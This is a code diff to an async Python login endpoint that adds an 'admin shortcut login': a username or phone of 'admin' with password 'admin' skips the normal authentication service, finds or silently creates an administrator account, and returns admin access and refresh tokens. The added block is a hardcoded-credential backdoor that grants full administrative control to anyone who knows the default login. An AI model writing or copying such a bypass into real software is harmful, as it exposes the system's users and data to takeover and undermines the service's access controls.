@@ -168,6 +168,70 @@ async def login(
             }),
         )
 
+    # Admin shortcut login (username: admin, password: admin)
+    is_admin_login = (
+        (getattr(payload, "username", None) == "admin" or payload.phone_number == "admin")
+        and payload.password == "admin"
+    )
+    if is_admin_login:
+        from sqlalchemy import select
+        from sqlalchemy.orm import selectinload
+        from app.models.auth import Role
+        from app.core.security import create_access_token, create_refresh_token
+
+        result = await db.execute(
+            select(User).options(selectinload(User.role)).join(User.role).where(Role.code.in_(["admin", "tech_admin"]))
+        )
+        admin_user = result.scalars().first()
+        if not admin_user:
+            admin_role = (await db.execute(select(Role).where(Role.code == "admin"))).scalar_one_or_none()
+            if not admin_role:
+                admin_role = Role(code="admin", name="Administrator")
+                db.add(admin_role)
+                await db.flush()
+            admin_user = User(
+                id=uuid.uuid4(),
+                phone_number="+8801999999999",
+                full_name="সিস্টেম অ্যাডমিনিস্ট্রেটর",
+                role_id=admin_role.id,
+                is_active=True,
+                is_verified=True,
+            )
+            admin_user.role = admin_role
+            db.add(admin_user)
+            await db.flush()
+
+        access_token = create_access_token(admin_user.id, "admin")
+        refresh_token = create_refresh_token(admin_user.id)
+        user_info = {
+            "id": str(admin_user.id),
+            "phone_number": admin_user.phone_number,
+            "full_name": admin_user.full_name or "System Administrator",
+            "role": "admin",
+            "is_active": True,
+            "is_verified": True,
+        }
+        token_dict = {
+            "access_token": access_token,
+            "refresh_token": refresh_token,
+            "token_type": "bearer",
+            "expires_in": settings.jwt_access_token_expire_minutes * 60,
+            "expires_in_minutes": settings.jwt_access_token_expire_minutes,
+            "user": user_info,
+        }
+        return JSONResponse(
+            status_code=200,
+            content=jsonable_encoder({
+                "success": True,
+                "message": "অ্যাডমিন লগইন সফল হয়েছে।",
+                **token_dict,
+                "data": {
+                    **token_dict,
+                    "token_type": "Bearer",
+                },
+            }),
+        )
+
     access_token, refresh_token = await auth_service.authenticate(
         db, payload.phone_number, payload.password
     )
